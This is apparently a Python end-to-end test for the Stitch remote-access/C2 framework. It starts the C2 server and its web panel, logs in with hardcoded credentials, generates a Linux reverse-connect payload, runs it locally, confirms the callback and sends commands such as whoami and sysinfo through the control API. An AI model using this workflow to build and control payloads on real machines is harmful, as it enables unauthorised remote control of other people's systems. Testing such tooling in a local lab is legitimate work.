#!/usr/bin/env python3
"""
Full end-to-end test of payload generation, execution, and C2 communication
Tests actual payload functionality, not simulations
"""

import os
import sys
import time
import json
import subprocess
import threading
import socket
import requests
from pathlib import Path

# Setup environment
sys.path.insert(0, '/workspace')
os.environ['PATH'] = os.environ.get('PATH', '') + ':/home/ubuntu/.local/bin'
os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'securetestpass123'

class C2Tester:
    def __init__(self):
        self.server_proc = None
        self.payload_proc = None
        self.web_session = None
        
    def start_c2_server(self):
        """Start the Stitch C2 server"""
        print("[*] Starting C2 Server...")
        
        # Start main.py which runs the Stitch server
        self.server_proc = subprocess.Popen(
            ['python3', 'main.py'],
            cwd='/workspace',
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait for server to be ready
        time.sleep(3)
        
        # Check if port 4040 is listening
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', 4040))
            sock.close()
            if result == 0:
                print("[+] C2 Server listening on port 4040")
                return True
        except:
            pass
        
        print("[-] C2 Server failed to start")
        return False
    
    def start_web_interface(self):
        """Start the web interface"""
        print("[*] Starting Web Interface...")
        
        # Create a script to run the web server
        web_script = """
import os
import sys
sys.path.insert(0, '/workspace')
os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'securetestpass123'
os.environ['STITCH_DEBUG'] = 'false'

# Import and run
from web_app_real import app, socketio, start_stitch_server
import threading

# Start background server thread
server_thread = threading.Thread(target=start_stitch_server, daemon=True)
server_thread.start()

# Run web interface
socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
"""
        
        with open('/tmp/run_web.py', 'w') as f:
            f.write(web_script)
        
        self.web_proc = subprocess.Popen(
            ['python3', '/tmp/run_web.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for web server
        time.sleep(5)
        
        # Check if web interface is running
        try:
            resp = requests.get('http://localhost:5000/health', timeout=5)
            if resp.status_code == 200:
                print("[+] Web Interface running on port 5000")
                return True
        except:
            pass
        
        print("[-] Web Interface failed to start")
        return False
    
    def generate_payload(self):
        """Generate a payload via web API"""
        print("\n[*] Generating Payload via Web API...")
        
        # Login first
        self.web_session = requests.Session()
        
        # Get login page for CSRF token
        resp = self.web_session.get('http://localhost:5000/login')
        
        # Login
        login_data = {
            'username': 'admin',
            'password': 'securetestpass123'
        }
        
        # Try to extract CSRF token if needed
        if 'csrf_token' in resp.text:
            import re
            match = re.search(r'name="csrf_token".*?value="([^"]+)"', resp.text)
            if match:
                login_data['csrf_token'] = match.group(1)
        
        resp = self.web_session.post('http://localhost:5000/login', 
                                     data=login_data,
                                     headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                     allow_redirects=False)
        
        if resp.status_code not in [302, 303]:
            print(f"[-] Login failed: {resp.status_code}")
            return None
        
        print("[+] Logged into web interface")
        
        # Generate Linux payload
        payload_config = {
            'bind_host': '',
            'bind_port': '',
            'listen_host': '127.0.0.1',  # Connect back to local C2
            'listen_port': '4040',        # C2 server port
            'enable_bind': False,
            'enable_listen': True,
            'platform': 'linux'
        }
        
        resp = self.web_session.post('http://localhost:5000/api/generate-payload',
                                     json=payload_config)
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success'):
                print(f"[+] Payload generated: {result.get('payload_type')} - {result.get('payload_size')} bytes")
                
                # Download the payload
                resp = self.web_session.get('http://localhost:5000/api/download-payload')
                if resp.status_code == 200:
                    payload_path = '/tmp/test_payload'
                    with open(payload_path, 'wb') as f:
                        f.write(resp.content)
                    os.chmod(payload_path, 0o755)
                    print(f"[+] Payload saved to: {payload_path}")
                    
                    # Verify it's an executable
                    with open(payload_path, 'rb') as f:
                        header = f.read(4)
                        if header == b'\x7fELF':
                            print("[+] Verified: Linux ELF executable")
                            return payload_path
                        elif b'python' in resp.content[:100].lower():
                            print("[!] Got Python script instead of binary")
                            # Still try to execute it
                            return payload_path
        
        print("[-] Failed to generate payload")
        return None
    
    def execute_payload(self, payload_path):
        """Execute the generated payload"""
        print(f"\n[*] Executing Payload: {payload_path}")
        
        # Check if it's a Python script or binary
        with open(payload_path, 'rb') as f:
            header = f.read(100)
        
        if b'python' in header.lower() or b'#!/' in header:
            # Python script
            print("[*] Executing as Python script...")
            self.payload_proc = subprocess.Popen(
                ['python3', payload_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        else:
            # Binary executable
            print("[*] Executing as binary...")
            self.payload_proc = subprocess.Popen(
                [payload_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        
        # Give it time to connect
        time.sleep(3)
        
        # Check if process is still running
        if self.payload_proc.poll() is None:
            print("[+] Payload is running (PID: {})".format(self.payload_proc.pid))
            return True
        else:
            stdout, stderr = self.payload_proc.communicate(timeout=1)
            print(f"[-] Payload exited immediately")
            print(f"    stdout: {stdout.decode()[:500] if stdout else 'None'}")
            print(f"    stderr: {stderr.decode()[:500] if stderr else 'None'}")
            return False
    
    def check_c2_connection(self):
        """Check if payload connected to C2 server"""
        print("\n[*] Checking C2 Connection...")
        
        # Check via web API
        resp = self.web_session.get('http://localhost:5000/api/connections')
        
        if resp.status_code == 200:
            connections = resp.json()
            
            if connections and len(connections) > 0:
                print(f"[+] Found {len(connections)} connection(s):")
                for conn in connections:
                    print(f"    - {conn.get('target')} ({conn.get('status')})")
                    if conn.get('status') == 'online':
                        return conn.get('id') or conn.get('target')
            else:
                print("[-] No connections found")
        else:
            print(f"[-] Failed to get connections: {resp.status_code}")
        
        return None
    
    def test_c2_commands(self, target_id):
        """Test executing commands on connected target"""
        print(f"\n[*] Testing C2 Command Execution on target: {target_id}")
        
        test_commands = [
            ('pwd', 'Get current directory'),
            ('whoami', 'Get current user'),
            ('sysinfo', 'Get system information'),
            ('ls', 'List files')
        ]
        
        for cmd, description in test_commands:
            print(f"\n  Testing: {description} ({cmd})")
            
            data = {
                'connection_id': target_id,
                'command': cmd
            }
            
            resp = self.web_session.post('http://localhost:5000/api/execute',
                                        json=data)
            
            if resp.status_code == 200:
                result = resp.json()
                if result.get('success'):
                    output = result.get('output', '')
                    print(f"  [+] Command executed successfully")
                    print(f"      Output: {output[:200]}...")
                else:
                    print(f"  [-] Command failed: {result.get('error')}")
            else:
                print(f"  [-] API error: {resp.status_code}")
        
        return True
    
    def cleanup(self):
        """Clean up all processes"""
        print("\n[*] Cleaning up...")
        
        if self.payload_proc:
            print("  - Terminating payload...")
            self.payload_proc.terminate()
            try:
                self.payload_proc.wait(timeout=5)
            except:
                self.payload_proc.kill()
        
        if self.web_proc:
            print("  - Stopping web interface...")
            self.web_proc.terminate()
            try:
                self.web_proc.wait(timeout=5)
            except:
                self.web_proc.kill()
        
        if self.server_proc:
            print("  - Stopping C2 server...")
            self.server_proc.terminate()
            try:
                self.server_proc.wait(timeout=5)
            except:
                self.server_proc.kill()
        
        print("[+] Cleanup complete")
    
    def run_full_test(self):
        """Run the complete end-to-end test"""
        print("="*70)
        print("FULL C2 END-TO-END TEST")
        print("="*70)
        
        try:
            # Start C2 server
            if not self.start_c2_server():
                print("[-] Failed to start C2 server")
                return False
            
            # Start web interface
            if not self.start_web_interface():
                print("[-] Failed to start web interface")
                return False
            
            # Generate payload
            payload_path = self.generate_payload()
            if not payload_path:
                print("[-] Failed to generate payload")
                return False
            
            # Execute payload
            if not self.execute_payload(payload_path):
                print("[-] Failed to execute payload")
                return False
            
            # Wait for connection
            print("\n[*] Waiting for payload to connect...")
            time.sleep(5)
            
            # Check C2 connection
            target_id = self.check_c2_connection()
            if not target_id:
                print("[-] Payload did not connect to C2")
                return False
            
            # Test C2 commands
            if not self.test_c2_commands(target_id):
                print("[-] C2 command execution failed")
                return False
            
            print("\n" + "="*70)
            print("[+] FULL C2 TEST SUCCESSFUL!")
            print("="*70)
            print("\nVerified:")
            print("  ✓ Payload generation via web interface")
            print("  ✓ Payload execution")
            print("  ✓ C2 connection established")
            print("  ✓ Command execution working")
            print("  ✓ Web interface can control payload")
            
            return True
            
        except Exception as e:
            print(f"\n[-] Test failed with exception: {e}")
            import traceback
            traceback.print_exc()
            return False
        
        finally:
            self.cleanup()

if __name__ == "__main__":
    tester = C2Tester()
    success = tester.run_full_test()
    sys.exit(0 if success else 1)